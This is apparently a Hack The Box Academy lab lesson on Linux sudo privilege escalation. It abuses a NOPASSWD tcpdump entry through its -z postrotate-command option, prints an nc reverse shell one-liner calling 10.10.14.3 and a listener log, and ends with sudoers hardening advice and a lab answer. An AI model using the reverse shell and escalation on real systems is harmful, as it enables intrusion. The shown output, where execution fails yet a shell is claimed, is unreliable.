Sudo privileges can be granted to an account, permitting the account to run certain commands in the context of the root (or another account) without having to change users or grant excessive privileges. When the `sudo` command is issued, the system will check if the user issuing the command has the appropriate rights, as configured in `/etc/sudoers`. When landing on a system, we should always check to see if the current user has any sudo privileges by typing `sudo -l`. Sometimes we will need to know the user's password to list their `sudo` rights, but any rights entries with the `NOPASSWD` option can be seen without entering a password.

```shell-session
htb_student@NIX02:~$ sudo -l

Matching Defaults entries for sysadm on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User sysadm may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/tcpdump
```

It is easy to misconfigure this. For example, a user may be granted root-level permissions without requiring a password. Or the permitted command line might be specified too loosely, allowing us to run a program in an unintended way, resulting in privilege escalation. For example, if the sudoers file is edited to grant a user the right to run a command such as `tcpdump` per the following entry in the sudoers file: `(ALL) NOPASSWD: /usr/sbin/tcpdump` an attacker could leverage this to take advantage of a the **postrotate-command** option.

```shell-session
htb_student@NIX02:~$ man tcpdump

<SNIP> 
-z postrorate-command              

Used in conjunction with the -C or -G options, this will make `tcpdump` run " postrotate-command file " where the file is the savefile being closed after each rotation. For example, specifying -z gzip or -z bzip2 will compress each savefile using gzip or bzip2.
```

By specifying the `-z` flag, an attacker could use `tcpdump` to execute a shell script, gain a reverse shell as the root user or run other privileged commands. For example, an attacker could create the shell script `.test` containing a reverse shell and execute it as follows:

```shell-session
htb_student@NIX02:~$ sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```

Let's try this out. First, make a file to execute with the `postrotate-command`, adding a simple reverse shell one-liner.

```shell-session
htb_student@NIX02:~$ cat /tmp/.test

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 443 >/tmp/f
```

Next, start a `netcat` listener on our attacking box and run `tcpdump` as root with the `postrotate-command`. If all goes to plan, we will receive a root reverse shell connection.

```shell-session
htb_student@NIX02:~$ sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root

dropped privs to root
tcpdump: listening on ens192, link-type EN10MB (Ethernet), capture size 262144 bytes
Maximum file limit reached: 1
1 packet captured
6 packets received by filter
compress_savefile: execlp(/tmp/.test, /dev/null) failed: Permission denied
0 packets dropped by kernel
```

We receive a root shell almost instantly.

```shell-session
KaoruRyusaki@htb[/htb]$ nc -lnvp 443

listening on [any] 443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.2.12] 38938

NIX02
```

[AppArmor](https://wiki.ubuntu.com/AppArmor) in more recent distributions has predefined the commands used with the `postrotate-command`, effectively preventing command execution. Two best practices that should always be considered when provisioning `sudo` rights:

1. Always specify the absolute path to any binaries listed in the `sudoers` file entry. Otherwise, an attacker may be able to leverage PATH abuse (which we will see in the next section) to create a malicious binary that will be executed when the command runs (i.e., if the `sudoers` entry specifies `cat` instead of `/bin/cat` this could likely be abused).
2. Grant `sudo` rights sparingly and based on the principle of least privilege. Does the user need full `sudo` rights? Can they still perform their job with one or two entries in the `sudoers` file? Limiting the privileged command that a user can run will greatly reduce the likelihood of successful privilege escalation.




#### Question

What command can the htb-student user run as root?

* Download the VPN file from the HTB Academy webpage
* Open your VM and go to your Downloads page from the terminal
* Run the command " openvpn academy-regular.ovpn " (if it doesnt work try running the same command with sudo)
* Use the user and password given by HTB and then SSH to the target system spawned for you by running this command "ssh htb-student@\<ip given>\"
* run command " sudo -l "
* /usr/bin/openssl
